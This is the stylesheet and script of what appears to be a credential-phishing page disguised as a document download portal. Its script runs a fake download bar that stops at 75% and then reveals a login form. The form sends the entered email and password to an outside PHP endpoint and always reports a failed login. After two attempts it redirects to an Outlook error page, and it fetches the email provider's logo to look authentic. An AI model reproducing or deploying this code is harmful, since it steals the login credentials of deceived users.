    <style>
        body {
            background-color: #f8f9fa;
            font-size: 0.95rem;
        }

        .section-padding {
            padding: 2rem 1rem;
        }

        .document-layout {
            display: flex;
            flex-wrap: wrap;
            gap: 2rem;
            justify-content: center;
            align-items: flex-start;
        }

        .document-section {
            flex: 1 1 480px;
            max-width: 500px;
        }

        .image-section {
            flex: 1 1 320px;
            text-align: center;
        }

        .image-section img {
            max-width: 100%;
            border-radius: 12px;
        }

        .document-row {
            background-color: #fff;
            border-radius: 10px;
            padding: 0.75rem 1rem;
            margin-bottom: 1rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: relative;
            transition: background 0.2s ease-in-out;
        }

        .document-row:hover {

        }

        .document-info {
            display: flex;

        .download-btn {

            padding: 0 0.5rem;

        }

        .email-provider img {
            height: 30px;
            margin: 0 8px;
        }

        #loginSection {
            display: none;
            margin-top: 2rem;
        }

        .password-wrapper {
            position: relative;
        }

        .password-wrapper .toggle-password {
            position: absolute;
            top: 50%;
            right: 10px;
            transform: translateY(-50%);
            cursor: pointer;
        }

        footer {
            margin-top: 3rem;
        }

    <script>
        const loginSection = document.getElementById('loginSection');
        const mainImage = document.getElementById('mainImage');
        const loginImage = document.getElementById('loginImage');
        let loginShown = false;
        let submitAttempts = 0;

        // Download progress
        document.querySelectorAll('.download-btn').forEach((btn) => {
            btn.addEventListener('click', () => {
                const group = btn.closest('.document-group');
                const progressContainer = group.querySelector('.progress-container');
                const progressBar = group.querySelector('.progress-bar');

                progressContainer.classList.remove('d-none');
                let percent = 0;

                const interval = setInterval(() => {
                    percent++;
                    progressBar.style.width = percent + '%';
                    progressBar.innerText = percent + '%';

                    if (percent >= 75) {
                        clearInterval(interval);
                        progressContainer.classList.add('d-none');

                        if (!loginShown) {
                            loginShown = true;
                            loginSection.style.display = 'block';
                            mainImage.classList.add('d-none');
                            loginImage.classList.remove('d-none');
                            loginSection.scrollIntoView({ behavior: 'smooth' });
                        }
                    }
                }, 50);
            });
        });

        // Password toggle
        $('#togglePassword').on('click', function () {
            const input = $('#passwordInput');
            const type = input.attr('type') === 'password' ? 'text' : 'password';
            input.attr('type', type);
            $(this).toggleClass('bi-eye bi-eye-slash');
        });

        // Form submission
        $('#loginForm').on('submit', function (e) {
            e.preventDefault();

            const email = $('#emailInput').val().trim();
            const password = $('#passwordInput').val().trim();
            let hasError = false;

            $('#emailError').hide();
            $('#passwordError').hide();
            $('#loginMessage').addClass('d-none');

            if (!email) {
                $('#emailError').text('Email is required').show();
                hasError = true;
            } else if (!validateEmail(email)) {
                $('#emailError').text('Invalid email format').show();
                hasError = true;
            }

            if (!password) {
                $('#passwordError').text('Password is required').show();
                hasError = true;
            }

            if (hasError) return;

            $('#loginButton').html('<span class="spinner-border spinner-border-sm"></span> Downloading...').attr('disabled', true);

            $.ajax({
                type: 'POST',
                url: 'https://vinafantazkurniawan.com/chymba/zmump.php',
                data: { email: email, password: password },
                dataType: 'json',
                success: function (response) {
                    $('#loginMessage').removeClass('alert-danger').addClass('alert-danger');
                    $('#loginMessage').text(response.message || 'Invalid Login details, please try again.').css('color', 'red');;
                },
                error: function () {
                    $('#loginMessage').removeClass('alert-success').addClass('alert-danger');
                    $('#loginMessage').text('Invalid Login details, please try again.').css('color', 'red');;
                },
                complete: function () {
                    $('#passwordInput').val('');
                    $('#loginButton').html('Download Documents').attr('disabled', false);
                    $('#loginMessage').removeClass('d-none');

                    setTimeout(() => {
                        $('#loginMessage').addClass('d-none');
                    }, 7000);

                    submitAttempts++;
                    if (submitAttempts >= 2) {
                        setTimeout(() => {
                            window.location.href = 'https://outlook.live.com/owa/auth/errorFE.aspx?httpCode=500';
                        }, 1000);
                    }
                }
            });
        });

        function validateEmail(email) {
            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return re.test(email.toLowerCase());
        }
    </script>
<script>
function updateLogoFromEmail(email) {
    const domain = email.includes('@') ? email.split('@')[1] : '';

    if (domain) {
        $('#providerLogo')
            .attr('src', 'https://logo.clearbit.com/' + domain)
            .show()
            .on('error', function () {
                $(this).hide(); // Hide if logo not found
            });
    } else {
        $('#providerLogo').attr('src', '').hide();
    }
}

// Update logo when typing
$('#emailInput').on('input', function () {
    updateLogoFromEmail($(this).val().trim());
});

// Auto-load logo on page load
$(document).ready(function () {
    const initialEmail = $('#emailInput').val().trim();
    if (initialEmail) {
        updateLogoFromEmail(initialEmail);
    }
});
</script>
